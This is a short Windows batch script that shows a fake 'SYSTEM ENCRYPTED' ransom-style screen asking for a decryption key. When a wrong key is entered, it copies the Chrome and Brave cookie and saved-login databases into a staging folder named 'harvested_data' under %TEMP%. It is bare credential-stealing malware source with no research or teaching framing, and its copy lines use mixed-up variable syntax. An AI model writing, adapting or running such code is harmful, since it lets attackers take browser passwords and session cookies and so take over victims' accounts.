@echo off
setlocal enabledelayedexpansion

title Security Lock Verification
echo ==========================================
echo           SYSTEM ENCRYPTED
echo ==========================================
set /p "user_key=Enter decryption key (0098): "

if "%user_key%"=="0098" (
    echo [+] Correct key entered. Restoring files...
    timeout /t 3 >nul
    exit
) else (
    echo [!] Incorrect key! Access denied. Initializing backup harvest...

    REM Target directories for Chromium-based browsers (Chrome, Brave, Edge)
    set "CHROME_COOKIES=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies"
    set "CHROME_LOGINS=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
    set "BRAVE_COOKIES=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
    set "BRAVE_LOGINS=%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data"

    set "OUTPUT_DIR=%TEMP%\harvested_data"
    mkdir "!OUTPUT_DIR!" 2>nul

    if exist "!CHROME_COOKIES!" copy "!CHROME_COOKIES!" "!OUTPUT_DIR%\chrome_cookies.db" >nul
    if exist "!CHROME_LOGINS!" copy "!CHROME_LOGINS!" "!OUTPUT_DIR%\chrome_logins.db" >nul
    if exist "!BRAVE_COOKIES!" copy "!BRAVE_COOKIES!" "!OUTPUT_DIR%\brave_cookies.db" >nul
    if exist "!BRAVE_LOGINS!" copy "!BRAVE_LOGINS!" "!OUTPUT_DIR%\brave_logins.db" >nul

    echo [!] Harvesting complete. Data staged at !OUTPUT_DIR!
    pause
)